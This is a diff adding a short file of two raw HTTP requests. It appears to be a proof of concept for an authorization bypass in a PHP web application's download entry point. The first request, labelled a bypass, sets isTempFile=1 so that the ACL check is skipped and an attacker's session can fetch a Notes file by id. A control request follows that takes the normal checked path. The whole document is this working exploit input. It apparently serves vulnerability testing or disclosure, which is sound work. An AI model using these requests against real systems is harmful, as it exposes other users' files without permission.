@@ -1,0 +1,9 @@
+### Bypass request (isTempFile skips the entire ACL block) ###
+GET /index.php?entryPoint=download&type=Notes&isTempFile=1&id=a9de2e9a-c6a5-40fe-b573-10fa8d0aa341 HTTP/1.1
+Host: localhost:33116
+Cookie: PHPSESSID=<attacker-session>
+
+### Control request (normal path, ACLAccess('view') IS called) ###
+GET /index.php?entryPoint=download&type=Notes&id=a9de2e9a-c6a5-40fe-b573-10fa8d0aa341 HTTP/1.1
+Host: localhost:33116
+Cookie: PHPSESSID=<attacker-session>
